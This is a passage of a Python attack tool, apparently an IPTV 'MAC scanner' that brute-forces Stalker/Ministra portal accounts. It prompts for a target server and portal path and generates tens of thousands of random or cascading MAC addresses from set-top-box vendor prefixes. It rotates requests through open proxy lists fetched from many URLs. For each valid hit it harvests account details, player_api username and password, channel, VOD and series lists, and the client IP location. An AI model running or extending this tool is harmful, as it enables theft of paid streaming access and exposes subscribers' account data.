			except:pass
		if not m3ulink=="":
			playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			plink=real.replace('http://','').replace('/c/','')
			playerapi=m3uapi(playerlink,mac,token)
			m3uimage=m3ugoruntu(cid,user,pas,plink)
			if playerapi=="":
			    playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			    plink=panel.replace('http://','').replace('/c/','')
			    playerapi=m3uapi(playerlink,mac,token)
			    m3uimage=m3ugoruntu(cid,user,pas,plink)
		if m3uimage=="✅ 𝗢𝗡𝗟𝗜𝗡𝗘 🥳":
			m3uvpn=m3uvpn+1
		else:
			m3uon=m3uon+1
		if durum=="⛔ 𝗨𝗦𝗘 𝗩𝗣𝗡 🤯 " or durum=="Invalid Opps":
			macvpn=macvpn+1
		else:
			macon=macon+1
		vpn=""
		if not ip =="":
			vpn=vpnip(ip)
		else:
			vpn="No Client IP Address"

		url5="https://ipapi.co/"+ip+"/json/" 
		while True:
    		 try:
        		 res = ses.get(url5, timeout=15, verify=False)
        		 break
    		 except:
        		 bag1=bag1+1
        		 time.sleep(bekleme)
        		 if bag1==4:
            		  break
		            	
		try:
		       bag1=0
		       veri=str(res.text)
		       scountry=""
		       country_name =""
		       scountry=veri.split('country_code": "')[1]
		       scountry=scountry.split('"')[0]
		       country_name=veri.split('country_name": "')[1]
		       country_name=country_name.split('"')[0]
		except:pass

		livelist=""
		vodlist=""
		serieslist=""
		urlkasay=""
		urlfsay=""
		urldsay=""
		livelist=""
		vodlist=""
		serieslist=""
		
		try:
			urlksay="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
			res = option.get(urlksay,timeout=15, verify=False)
			veri=str(res.text)
			kanalsayisi=str(veri.count("stream_id"))
			
			urlfsay="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
			res = option.get(urlfsay, timeout=15, verify=False)
			veri=str(res.text)
			filmsayisi=str(veri.count("stream_id"))
			
			urldsay="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
			res = option.get(urldsay,  timeout=15, verify=False)
			veri=str(res.text)
			dizisayisi=str(veri.count("series_id"))

		except:pass		
		
		liveurl=http+"://"+panel+"/"+uzmanm+"?action=get_genres&type=itv&JsHttpRequest=1-xml"
		if not expires=="":
			liveurl=http+"://"+panel+"/"+uzmanm+"?type=itv&action=get_genres&JsHttpRequest=1-xml" 
		if uzmanm=="stalker_portal/server/load.php":
			liveurl=http+"://"+panel+"/"+uzmanm+"?type=itv&action=get_genres&JsHttpRequest=1-xml"
		vodurl=http+"://"+panel+"/"+uzmanm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"
		seriesurl=http+"://"+panel+"/"+uzmanm+"?action=get_categories&type=series&JsHttpRequest=1-xml"
		if kanalkata=="1" or kanalkata=="2" or kanalkata=="3":
			listlink=liveurl
			livel='⍟'
			livelist=list(listlink,mac,token,livel)
			livelist=livelist.upper()
			livelist=livelist.replace("«»","")
			livelist=livelist.replace("⍟AE"," |🇦🇪 AE")
			livelist=livelist.replace("⍟UAE"," |🇦🇪 UAE")
			livelist=livelist.replace("⍟ALL"," |🏁ALL")
			livelist=livelist.replace("⍟ALB"," |🇦🇱 ALB")
			livelist=livelist.replace("⍟ASIA"," 🈲️ ASIA")
			livelist=livelist.replace("⍟AR"," |🇸🇦 AR")
			livelist=livelist.replace("⍟AT"," |🇦🇹 AT")
			livelist=livelist.replace("⍟AU"," |🇦🇺 AU")
			livelist=livelist.replace("⍟AZ"," |🇦🇿 AZ")
			livelist=livelist.replace("⍟BE"," |🇧🇪 BE")
			livelist=livelist.replace("⍟BG"," |🇧🇬 BG")
			livelist=livelist.replace("⍟BIH"," |🇧🇦 BIH")
			livelist=livelist.replace("⍟BO"," |🇧🇴 BO")
			livelist=livelist.replace("⍟BR"," |🇧🇷 BR")
			livelist=livelist.replace("⍟CA"," |🇨🇦 CA")
			livelist=livelist.replace("⍟CH"," |🇨🇭 CH")
			livelist=livelist.replace("⍟SW"," |🇨🇭 SW")
			livelist=livelist.replace("⍟CL"," |🇨🇱 CL")
			livelist=livelist.replace("⍟CN"," |🇨🇳 CN")
			livelist=livelist.replace("⍟CO"," |🇨🇴 CO")
			livelist=livelist.replace("⍟CR"," |🇭🇷 CR")
			livelist=livelist.replace("⍟CZ"," |🇨🇿 CZ")
			livelist=livelist.replace("⍟DE"," |🇩🇪 DE")
			livelist=livelist.replace("⍟De"," |🇩🇪 De")
			livelist=livelist.replace("⍟GE"," |🇩🇪 GE")
			livelist=livelist.replace("⍟DK"," |🇩🇰 DK")
			livelist=livelist.replace("⍟DM"," |🇩🇰 DM")
			livelist=livelist.replace("⍟EC"," |🇪🇨 EC")
			livelist=livelist.replace("⍟EG"," |🇪🇬 EG")
			livelist=livelist.replace("⍟EN"," |🇬🇧 EN")
			livelist=livelist.replace("⍟GB"," |🇬🇧 GB")
			livelist=livelist.replace("⍟UK"," |🇬🇧 UK")
			livelist=livelist.replace("⍟EU"," |🇪🇺 EU")
			livelist=livelist.replace("⍟ES"," |🇪🇸 ES")
			livelist=livelist.replace("⍟SP"," |🇪🇸 SP")
			livelist=livelist.replace("⍟EX"," |🇭🇷 EX")
			livelist=livelist.replace("⍟YU"," |🇭🇷 YU")
			livelist=livelist.replace("⍟FI"," |🇫🇮 FI")
			livelist=livelist.replace("⍟FR"," |🇫🇷 FR")
			livelist=livelist.replace("⍟FI"," |🇫🇮 FI")
			livelist=livelist.replace("⍟GOR"," |🇲🇪 GOR")
			livelist=livelist.replace("⍟GR"," |🇬🇷 GR")
			livelist=livelist.replace("⍟HR"," |🇭🇷 HR")
			livelist=livelist.replace("⍟HU"," |🇭🇺 HU")
			livelist=livelist.replace("⍟IE"," |🇮🇪 IE")
			livelist=livelist.replace("⍟IL"," |🇮🇪 IL")
			livelist=livelist.replace("⍟IR"," |🇮🇪 IR")
			livelist=livelist.replace("⍟ID"," |🇮🇩 ID")
			livelist=livelist.replace("⍟IN"," |🇮🇳 IN")
			livelist=livelist.replace("⍟IT"," |🇮🇹 IT")
			livelist=livelist.replace("⍟JP"," |🇯🇵 JP")
			livelist=livelist.replace("⍟KE"," |🇰🇪 KE")
			livelist=livelist.replace("⍟KU"," |🇭🇺 KU")
			livelist=livelist.replace("⍟KR"," |🇰🇷 KR")
			livelist=livelist.replace("⍟LU"," |🇱🇺 LU")
			livelist=livelist.replace("⍟MKD"," |🇲🇰 MKD")
			livelist=livelist.replace("⍟MX"," |🇲🇽 MX")
			livelist=livelist.replace("⍟MY"," |🇲🇾 MY")
			livelist=livelist.replace("⍟NETFLIX"," | 🚩 NETFLIX")
			livelist=livelist.replace("⍟NG"," |🇳🇬 NG")
			livelist=livelist.replace("⍟NZ"," |🇳🇿 NZ")
			livelist=livelist.replace("⍟NL"," |🇳🇱 NL")
			livelist=livelist.replace("⍟NO"," |🇳🇴 NO")
			livelist=livelist.replace("⍟PA"," |🇵🇦 PA")
			livelist=livelist.replace("⍟PE"," |🇵🇪 PE")
			livelist=livelist.replace("⍟PH"," |🇵🇭 PH")
			livelist=livelist.replace("⍟PK"," |🇵🇰 PK")
			livelist=livelist.replace("⍟PL"," |🇵🇱 PL")
			livelist=livelist.replace("⍟PT"," |🇵🇹 PT")
			livelist=livelist.replace("⍟PPV"," |🏋🏼‍♂️ PPV")
			livelist=livelist.replace("⍟QA"," |🇶🇦 QA")
			livelist=livelist.replace("⍟RO"," |🇷🇴 RO")
			livelist=livelist.replace("⍟RU"," |🇷🇺 RU")
			livelist=livelist.replace("⍟SA"," |🇸🇦 SA")
			livelist=livelist.replace("⍟SCREENSAVER"," | 🏞 SCREENSAVER")
			livelist=livelist.replace("⍟SE"," |🇸🇪 SE")
			livelist=livelist.replace("⍟SK"," |🇸🇰 SK")
			livelist=livelist.replace("⍟SL"," |🇸🇮 SL")
			livelist=livelist.replace("⍟SG"," |🇸🇬 SG")
			livelist=livelist.replace("⍟SR"," |🇷🇸 SR")
			livelist=livelist.replace("⍟SU"," |🇦🇲 SU")
			livelist=livelist.replace("⍟TH"," |🇹🇭 TH")
			livelist=livelist.replace("⍟TR"," |🇹🇷 TR")
			livelist=livelist.replace("⍟TW"," |🇹🇼 TW")
			livelist=livelist.replace("⍟UKR"," |🇺🇦 UKR")
			livelist=livelist.replace("⍟US"," |🇺🇸 US")
			livelist=livelist.replace("⍟VN"," |🇻🇳 VN")
			livelist=livelist.replace("⍟VIP"," |⚽️ VIP")
			livelist=livelist.replace("⍟WEB"," |🏳️‍🌈 WEB")
			livelist=livelist.replace("⍟ZA"," |🇿🇦 ZA")
			livelist=livelist.replace("⍟AF"," |🇿🇦 AF")
			livelist=livelist.replace("⍟ADU"," |🔞 ADULTS")
			livelist=livelist.replace("⍟FO"," |🔞 FOR")
			livelist=livelist.replace("⍟⋅ FOR"," |🔞 ⋅ FOR")
			livelist=livelist.replace("⍟BLU"," |🔞 BLU")
			livelist=livelist.replace("⍟XXX"," |🔞 XXX")
			livelist=livelist.replace("⍟"," |®️ ")
		if kanalkata=="2" or kanalkata=="3":
			listlink=vodurl
			livel='⍟'
			vodlist=list(listlink,mac,token,livel)
			vodlist=vodlist.upper()
			vodlist=vodlist.replace("«»","")
			vodlist=vodlist.replace("⍟AE"," |🇦🇪 AE")
			vodlist=vodlist.replace("⍟UAE"," |🇦🇪 UAE")
			vodlist=vodlist.replace("⍟ALL"," |🏁ALL")
			vodlist=vodlist.replace("⍟ALB"," |🇦🇱 ALB")
			vodlist=vodlist.replace("⍟AR"," |🇸🇦 AR")
			vodlist=vodlist.replace("⍟ASIA"," 🈲️ ASIA")
			vodlist=vodlist.replace("⍟AT"," |🇦🇹 AT")
			vodlist=vodlist.replace("⍟AU"," |🇦🇺 AU")
			vodlist=vodlist.replace("⍟AZ"," |🇦🇿 AZ")
			vodlist=vodlist.replace("⍟BE"," |🇧🇪 BE")
			vodlist=vodlist.replace("⍟BG"," |🇧🇬 BG")
			vodlist=vodlist.replace("⍟BIH"," |🇧🇦 BIH")
			vodlist=vodlist.replace("⍟BO"," |🇧🇴 BO")
			vodlist=vodlist.replace("⍟BR"," |🇧🇷 BR")
			vodlist=vodlist.replace("⍟CA"," |🇨🇦 CA")
			vodlist=vodlist.replace("⍟CH"," |🇨🇭 CH")
			vodlist=vodlist.replace("⍟SW"," |🇨🇭 SW")
			vodlist=vodlist.replace("⍟CL"," |🇨🇱 CL")
			vodlist=vodlist.replace("⍟CN"," |🇨🇳 CN")
			vodlist=vodlist.replace("⍟CO"," |🇨🇴 CO")
			vodlist=vodlist.replace("⍟CR"," |🇭🇷 CR")
			vodlist=vodlist.replace("⍟CZ"," |🇨🇿 CZ")
			vodlist=vodlist.replace("⍟DE"," |🇩🇪 DE")
			vodlist=vodlist.replace("⍟De"," |🇩🇪 De")
			vodlist=vodlist.replace("⍟GE"," |🇩🇪 GE")
			vodlist=vodlist.replace("⍟DK"," |🇩🇰 DK")
			vodlist=vodlist.replace("⍟DM"," |🇩🇰 DM")
			vodlist=vodlist.replace("⍟EC"," |🇪🇨 EC")
			vodlist=vodlist.replace("⍟EG"," |🇪🇬 EG")
			vodlist=vodlist.replace("⍟EN"," |🇬🇧 EN")
			vodlist=vodlist.replace("⍟GB"," |🇬🇧 GB")
			vodlist=vodlist.replace("⍟UK"," |🇬🇧 UK")
			vodlist=vodlist.replace("⍟EU"," |🇪🇺 EU")
			vodlist=vodlist.replace("⍟ES"," |🇪🇸 ES")
			vodlist=vodlist.replace("⍟SP"," |🇪🇸 SP")
			vodlist=vodlist.replace("⍟EX"," |🇭🇷 EX")
			vodlist=vodlist.replace("⍟YU"," |🇭🇷 YU")
			vodlist=vodlist.replace("⍟FI"," |🇫🇮 FI")
			vodlist=vodlist.replace("⍟FR"," |🇫🇷 FR")
			vodlist=vodlist.replace("⍟FI"," |🇫🇮 FI")
			vodlist=vodlist.replace("⍟GOR"," |🇲🇪 GOR")
			vodlist=vodlist.replace("⍟GR"," |🇬🇷 GR")
			vodlist=vodlist.replace("⍟HR"," |🇭🇷 HR")
			vodlist=vodlist.replace("⍟HU"," |🇭🇺 HU")
			vodlist=vodlist.replace("⍟IE"," |🇮🇪 IE")
			vodlist=vodlist.replace("⍟IL"," |🇮🇪 IL")
			vodlist=vodlist.replace("⍟IR"," |🇮🇪 IR")
			vodlist=vodlist.replace("⍟ID"," |🇮🇩 ID")
			vodlist=vodlist.replace("⍟IN"," |🇮🇳 IN")
			vodlist=vodlist.replace("⍟IT"," |🇮🇹 IT")
			vodlist=vodlist.replace("⍟JP"," |🇯🇵 JP")
			vodlist=vodlist.replace("⍟KE"," |🇰🇪 KE")
			vodlist=vodlist.replace("⍟KU"," |🇭🇺 KU")
			vodlist=vodlist.replace("⍟KR"," |🇰🇷 KR")
			vodlist=vodlist.replace("⍟LU"," |🇱🇺 LU")
			vodlist=vodlist.replace("⍟MKD"," |🇲🇰 MKD")
			vodlist=vodlist.replace("⍟MX"," |🇲🇽 MX")
			vodlist=vodlist.replace("⍟MY"," |🇲🇾 MY")
			vodlist=vodlist.replace("⍟NETFLIX"," | 🚩 NETFLIX")
			vodlist=vodlist.replace("⍟NG"," |🇳🇬 NG")
			vodlist=vodlist.replace("⍟NZ"," |🇳🇿 NZ")
			vodlist=vodlist.replace("⍟NL"," |🇳🇱 NL")
			vodlist=vodlist.replace("⍟NO"," |🇳🇴 NO")
			vodlist=vodlist.replace("⍟PA"," |🇵🇦 PA")
			vodlist=vodlist.replace("⍟PE"," |🇵🇪 PE")
			vodlist=vodlist.replace("⍟PH"," |🇵🇭 PH")
			vodlist=vodlist.replace("⍟PK"," |🇵🇰 PK")
			vodlist=vodlist.replace("⍟PL"," |🇵🇱 PL")
			vodlist=vodlist.replace("⍟PT"," |🇵🇹 PT")
			vodlist=vodlist.replace("⍟PPV"," |🏋🏼‍♂️ PPV")
			vodlist=vodlist.replace("⍟QA"," |🇶🇦 QA")
			vodlist=vodlist.replace("⍟RO"," |🇷🇴 RO")
			vodlist=vodlist.replace("⍟RU"," |🇷🇺 RU")
			vodlist=vodlist.replace("⍟SA"," |🇸🇦 SA")
			vodlist=vodlist.replace("⍟SCREENSAVER"," | 🏞 SCREENSAVER")
			vodlist=vodlist.replace("⍟SE"," |🇸🇪 SE")
			vodlist=vodlist.replace("⍟SK"," |🇸🇰 SK")
			vodlist=vodlist.replace("⍟SL"," |🇸🇮 SL")
			vodlist=vodlist.replace("⍟SG"," |🇸🇬 SG")
			vodlist=vodlist.replace("⍟SR"," |🇷🇸 SR")
			vodlist=vodlist.replace("⍟SU"," |🇦🇲 SU")
			vodlist=vodlist.replace("⍟TH"," |🇹🇭 TH")
			vodlist=vodlist.replace("⍟TR"," |🇹🇷 TR")
			vodlist=vodlist.replace("⍟TW"," |🇹🇼 TW")
			vodlist=vodlist.replace("⍟UKR"," |🇺🇦 UKR")
			vodlist=vodlist.replace("⍟US"," |🇺🇸 US")
			vodlist=vodlist.replace("⍟VN"," |🇻🇳 VN")
			vodlist=vodlist.replace("⍟VIP"," |⚽️ VIP")
			vodlist=vodlist.replace("⍟WEB"," |🏳️‍🌈 WEB")
			vodlist=vodlist.replace("⍟ZA"," |🇿🇦 ZA")
			vodlist=vodlist.replace("⍟AF"," |🇿🇦 AF")
			vodlist=vodlist.replace("⍟ADU"," |🔞 ADULTS")
			vodlist=vodlist.replace("⍟FO"," |🔞 FOR")
			vodlist=vodlist.replace("⍟⋅ FOR"," |🔞 ⋅ FOR")
			vodlist=vodlist.replace("⍟BLU"," |🔞 BLU")
			vodlist=vodlist.replace("⍟XXX"," |🔞 XXX")
			vodlist=vodlist.replace("⍟"," |®️ ")
	
			listlink=seriesurl
			livel='⍟'
			serieslist=list(listlink,mac,token,livel)
			serieslist=serieslist.upper()
			serieslist=serieslist.replace("«»","")
			serieslist=serieslist.replace("⍟AE"," |🇦🇪 AE")
			serieslist=serieslist.replace("⍟UAE"," |🇦🇪 UAE")
			serieslist=serieslist.replace("⍟ALL"," |🏁ALL")
			serieslist=serieslist.replace("⍟ALB"," |🇦🇱 ALB")
			serieslist=serieslist.replace("⍟AR"," |🇸🇦 AR")
			serieslist=serieslist.replace("⍟ASIA"," 🈲️ ASIA")
			serieslist=serieslist.replace("⍟AT"," |🇦🇹 AT")
			serieslist=serieslist.replace("⍟AU"," |🇦🇺 AU")
			serieslist=serieslist.replace("⍟AZ"," |🇦🇿 AZ")
			serieslist=serieslist.replace("⍟BE"," |🇧🇪 BE")
			serieslist=serieslist.replace("⍟BG"," |🇧🇬 BG")
			serieslist=serieslist.replace("⍟BIH"," |🇧🇦 BIH")
			serieslist=serieslist.replace("⍟BO"," |🇧🇴 BO")
			serieslist=serieslist.replace("⍟BR"," |🇧🇷 BR")
			serieslist=serieslist.replace("⍟CA"," |🇨🇦 CA")
			serieslist=serieslist.replace("⍟CH"," |🇨🇭 CH")
			serieslist=serieslist.replace("⍟SW"," |🇨🇭 SW")
			serieslist=serieslist.replace("⍟CL"," |🇨🇱 CL")
			serieslist=serieslist.replace("⍟CN"," |🇨🇳 CN")
			serieslist=serieslist.replace("⍟CO"," |🇨🇴 CO")
			serieslist=serieslist.replace("⍟CR"," |🇭🇷 CR")
			serieslist=serieslist.replace("⍟CZ"," |🇨🇿 CZ")
			serieslist=serieslist.replace("⍟DE"," |🇩🇪 DE")
			serieslist=serieslist.replace("⍟De"," |🇩🇪 De")
			serieslist=serieslist.replace("⍟GE"," |🇩🇪 GE")
			serieslist=serieslist.replace("⍟DK"," |🇩🇰 DK")
			serieslist=serieslist.replace("⍟DM"," |🇩🇰 DM")
			serieslist=serieslist.replace("⍟EC"," |🇪🇨 EC")
			serieslist=serieslist.replace("⍟EG"," |🇪🇬 EG")
			serieslist=serieslist.replace("⍟EN"," |🇬🇧 EN")
			serieslist=serieslist.replace("⍟GB"," |🇬🇧 GB")
			serieslist=serieslist.replace("⍟UK"," |🇬🇧 UK")
			serieslist=serieslist.replace("⍟EU"," |🇪🇺 EU")
			serieslist=serieslist.replace("⍟ES"," |🇪🇸 ES")
			serieslist=serieslist.replace("⍟SP"," |🇪🇸 SP")
			serieslist=serieslist.replace("⍟EX"," |🇭🇷 EX")
			serieslist=serieslist.replace("⍟YU"," |🇭🇷 YU")
			serieslist=serieslist.replace("⍟FI"," |🇫🇮 FI")
			serieslist=serieslist.replace("⍟FR"," |🇫🇷 FR")
			serieslist=serieslist.replace("⍟FI"," |🇫🇮 FI")
			serieslist=serieslist.replace("⍟GOR"," |🇲🇪 GOR")
			serieslist=serieslist.replace("⍟GR"," |🇬🇷 GR")
			serieslist=serieslist.replace("⍟HR"," |🇭🇷 HR")
			serieslist=serieslist.replace("⍟HU"," |🇭🇺 HU")
			serieslist=serieslist.replace("⍟IE"," |🇮🇪 IE")
			serieslist=serieslist.replace("⍟IL"," |🇮🇪 IL")
			serieslist=serieslist.replace("⍟IR"," |🇮🇪 IR")
			serieslist=serieslist.replace("⍟ID"," |🇮🇩 ID")
			serieslist=serieslist.replace("⍟IN"," |🇮🇳 IN")
			serieslist=serieslist.replace("⍟IT"," |🇮🇹 IT")
			serieslist=serieslist.replace("⍟JP"," |🇯🇵 JP")
			serieslist=serieslist.replace("⍟KE"," |🇰🇪 KE")
			serieslist=serieslist.replace("⍟KU"," |🇭🇺 KU")
			serieslist=serieslist.replace("⍟KR"," |🇰🇷 KR")
			serieslist=serieslist.replace("⍟LU"," |🇱🇺 LU")
			serieslist=serieslist.replace("⍟MKD"," |🇲🇰 MKD")
			serieslist=serieslist.replace("⍟MX"," |🇲🇽 MX")
			serieslist=serieslist.replace("⍟MY"," |🇲🇾 MY")
			serieslist=serieslist.replace("⍟NETFLIX"," | 🚩 NETFLIX")
			serieslist=serieslist.replace("⍟NG"," |🇳🇬 NG")
			serieslist=serieslist.replace("⍟NZ"," |🇳🇿 NZ")
			serieslist=serieslist.replace("⍟NL"," |🇳🇱 NL")
			serieslist=serieslist.replace("⍟NO"," |🇳🇴 NO")
			serieslist=serieslist.replace("⍟PA"," |🇵🇦 PA")
			serieslist=serieslist.replace("⍟PE"," |🇵🇪 PE")
			serieslist=serieslist.replace("⍟PH"," |🇵🇭 PH")
			serieslist=serieslist.replace("⍟PK"," |🇵🇰 PK")
			serieslist=serieslist.replace("⍟PL"," |🇵🇱 PL")
			serieslist=serieslist.replace("⍟PT"," |🇵🇹 PT")
			serieslist=serieslist.replace("⍟PPV"," |🏋🏼‍♂️ PPV")
			serieslist=serieslist.replace("⍟QA"," |🇶🇦 QA")
			serieslist=serieslist.replace("⍟RO"," |🇷🇴 RO")
			serieslist=serieslist.replace("⍟RU"," |🇷🇺 RU")
			serieslist=serieslist.replace("⍟SA"," |🇸🇦 SA")
			serieslist=serieslist.replace("⍟SCREENSAVER"," | 🏞 SCREENSAVER")
			serieslist=serieslist.replace("⍟SE"," |🇸🇪 SE")
			serieslist=serieslist.replace("⍟SK"," |🇸🇰 SK")
			serieslist=serieslist.replace("⍟SL"," |🇸🇮 SL")
			serieslist=serieslist.replace("⍟SG"," |🇸🇬 SG")
			serieslist=serieslist.replace("⍟SR"," |🇷🇸 SR")
			serieslist=serieslist.replace("⍟SU"," |🇦🇲 SU")
			serieslist=serieslist.replace("⍟TH"," |🇹🇭 TH")
			serieslist=serieslist.replace("⍟TR"," |🇹🇷 TR")
			serieslist=serieslist.replace("⍟TW"," |🇹🇼 TW")
			serieslist=serieslist.replace("⍟UKR"," |🇺🇦 UKR")
			serieslist=serieslist.replace("⍟US"," |🇺🇸 US")
			serieslist=serieslist.replace("⍟VN"," |🇻🇳 VN")
			serieslist=serieslist.replace("⍟VIP"," |⚽️ VIP")
			serieslist=serieslist.replace("⍟WEB"," |🏳️‍🌈 WEB")
			serieslist=serieslist.replace("⍟ZA"," |🇿🇦 ZA")
			serieslist=serieslist.replace("⍟AF"," |🇿🇦 AF")
			serieslist=serieslist.replace("⍟ADU"," |🔞 ADULTS")
			serieslist=serieslist.replace("⍟FO"," |🔞 FOR")
			serieslist=serieslist.replace("⍟⋅ FOR"," |🔞 ⋅ FOR")
			serieslist=serieslist.replace("⍟BLU"," |🔞 BLU")
			serieslist=serieslist.replace("⍟XXX"," |🔞 XXX")
			serieslist=serieslist.replace("⍟"," |®️ ")
		
		hityaz(mac,trh,real,m3ulink,m3uimage,durum,vpn,livelist,vodlist,serieslist,playerapi,fname,tariff_plan,ls,login,password,tariff_plan_id,bill,expire_billing_date,max_online,parent_password,stb_type,comment,country,settings_password,adult,scountry,country_name)

	
	
def vpnip(ip):
	url9="https://freegeoip.app/json/"+ip
	vpnip=""
	vpn="Not Invalid"
	veri=""
	try:
		res = ses.get(url9,  timeout=7, verify=False)
		veri=str(res.text)
	except:
		vpn="Not Invalid"
	if not '404 page' in veri:
		if 'country_name' in veri:
			vpnc=veri.split('"city":"')[1]
			vpnc=vpnc.split('"')[0]
			vpnips=veri.split('"country_name":"')[1]
			vpn=vpnips.split('"')[0]
			vpn= vpn +' / ' +vpnc
	else:
			vpn="Not Invalid"
	return vpn
import socket
print("\033[1;38;2;255;255;0m\n==============================================\033[0m")
print("\033[92m\nEscribe tu Servidor (http://aless.best:80\033[0m")
panel=input("\nServidor:Puerto = ")
print()
print("\033[1;38;2;255;255;0m==============================================\033[0m\n")
print("\033[92m\nElige el tipo de portal \033[0m")
ban=""
uzmanm="portal.php"
realblue=""
reqs=(
"portal.php", 
"server/load.php",
"c/portal.php ",
"stalker_portal/server/load.php",
"stalker_portal/server/load.php - old",
"stalker_portal/server/load.php - «▣»",
"portal.php - Real Blue",
"portal.php - httpS",
"stalker_portal/server/load.php - httpS",
)
say=0
for i in reqs:
	say=say+1
	print(str(say)+"=⫸ "+str(i))
say=0
uzmanm=input('\nElegiste el número = ')
if uzmanm=="0":
	uzmanm=input("Write Request:")
if uzmanm=="":
	uzmanm="portal.php"
	
uzmanm=reqs[int(uzmanm)-1]
if uzmanm=="stalker_portal/server/load.php - old":
	stalker_portal="2"
	uzmanm="stalker_portal/server/load.php"
if uzmanm=="stalker_portal/server/load.php - «▣»":
	stalker_portal="1"
	uzmanm="stalker_portal/server/load.php"	
if uzmanm=="portal.php - No Ban":
	ban="ban"
	uzmanm="portal.php"
http="http"
if uzmanm=="portal.php - Real Blue":
	realblue="real"
	uzmanm="portal.php"
if uzmanm=="portal.php - httpS":
	uzmanm="portal.php"
	http="https"
if uzmanm=="stalker_portal/server/load.php - httpS":
	uzmanm="stalker_portal/server/load.php"
	http="https"
print(uzmanm)
#uzmanm="magLoad.php"
panel=panel.replace('stalker_portal','')
panel=panel.replace('http://','')
panel=panel.replace('/c/','')
panel=panel.replace('/c','')
panel=panel.replace('/','')
panel=panel.replace(' ','')

print("\033[1;38;2;255;255;0m=================================================\033[0m\n")
print("\033[92m\nCOMBO SELECTION : @PRL \033[0m")
#http://gotv.one/stalker_portal/c/
import urllib3
import os
def temizle():
    os.system('clear')
yeninesil=(
'00:1A:79:',
'D4:CF:F9:',
'33:44:CF:',
'10:27:BE:',
'A0:BB:3E:',
'55:93:EA:',  
'04:D6:AA:',
'11:33:01:',
'00:1C:19:',
'1A:00:6A:',
'1A:00:FB:',
'00:A1:79:',
'00:1B:79:',
'00:2A:79:',
)
comboc=""
combototLen=""
combouz=0
combodosya=""
proxyc=""
proxytotLen=""
proxydosya=""
proxyuz=0

def dosyasec():
	global comboc,combototLen,proxyuz,proxydosya,combodosya,proxyc,proxytotLen,proxyuz,combouz,randomturu,serim,seri,mactur,randommu
	say=0
	dsy=""
	
	if comboc=="":
		mesaj="Elegiste el "
		dir=rootDir+ '/combo/'
		dsy="\n\033[92m0=⫸ Random (AUTO MAC)  \033[0m\n"
	else:
		mesaj="Selecciona el combo proxy..!\nSelect the combo where it is the proxy"
		dir=rootDir+'/proxy/'
	if not os.path.exists(dir):
	    os.mkdir(dir)
	for files in os.listdir (dir):
	 	say=say+1
	 	dsy=dsy+str(say)+"=⫸ "+files+'\n'
	print ("""Elige el combo de tu lista!!

"""+dsy+"""
\33[33m Tienes """ +str(say)+""" combos... elige uno
	""")
	dsyno=str(input("\33[31m"+mesaj+"Combo No = \33[0m"))
	say=0
	for files in os.listdir (dir):
		 say=say+1
		 if dsyno==str(say):
		 	dosya=(dir+files)
		 	break
	say=0
	try:
		 if not dosya=="":
		 	print(dosya)
		 else:
		 		temizle()
		 		print("Incorrect combo file selection..!")
		 		quit()
	except:
		if comboc=="":
			if dsyno=="0" or dsyno=="":
				temizle()
				nnesil=str(yeninesil)
				nnesil=(nnesil.count(',')+1)
				for xd in range(0,(nnesil)):
		 			tire='  》'
		 			if int(xd) <9:
		 				tire='   》'
		 			print(str(xd+1)+tire+yeninesil[xd])
				mactur=input("\nSelecciona el tipo de Mac!\n\nRespuesta = ")
				if mactur=="":
		 			mactur=1
				randomturu=input("""
Elige el tipo de combinación Mac

\33[33mFor cascading mac = \33[31m1
\33[33mFor random mac  = \33[31m2
		
\33[0m\33[1mTipo de Mac= \33[31m""")
				if randomturu=="":
		 			randomturu="2"
				serim=""
				serim=input("""\33[0m
\33[33mUsaras series mac?\n
\33[1m\33[34mSi (1) \33[0m o \33[1m\33[32mNo (2) \33[0m Elige el número! 
		
Respuesta = """)
				mactur=yeninesil[int(mactur)-1]
				if serim =="1":
		 			seri=input("Sample="+mactur+"\33[31m5\33[0m\nSample="+mactur+"\33[31mFa\33[32m\nWrite one or two values!!!\33[0m\n\33[1m"+mactur+"\33[31m")
				combouz=input("""\33[0m
		 		
Escriba el número de macs a escanear?
		
Numero de macs = """)
				if combouz=="":
		 			combouz=30000
				combouz=int(combouz)
				randommu="PRLHits"
		else:
			temizle()
			print("Incorrect combo file selection...!")
			quit()
	if comboc=="":
		if randommu=="":
			combodosya=dosya
			comboc=open(dosya, 'r')
			combototLen=comboc.readlines()
			combouz=(len(combototLen))
		else:
			comboc='PRL'
	else:
		#if not comboc=='PRL':
			proxydosya=dosya
			proxyc=open(dosya, 'r')
			proxytotLen=proxyc.readlines()
			proxyuz=(len(proxytotLen))
			

randommu=""
dosyasec()
https=["https://proxyspace.pro/https.txt", 
          "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
          "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
          "https://api.openproxylist.xyz/http.txt",
          "https://api.proxyscrape.com/v2/?request=getproxies&protocol=https&timeout=10000&country=all&ssl=all&anonymity=all",
		  "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
		  "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
		  "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
		  "https://www.proxy-list.download/api/v1/get?type=http",
		  "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt",
		  "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/https.txt",
		  "https://raw.githubusercontent.com/JIH4DHoss4in/PROXY-List/main/http.txt",
		  "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
		  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
		  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
		  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
		  "https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/http.txt",
		  "https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
		  "https://raw.githubusercontent.com/fahimscirex/proxybd/master/proxylist/http.txt",
		  "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
		  "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
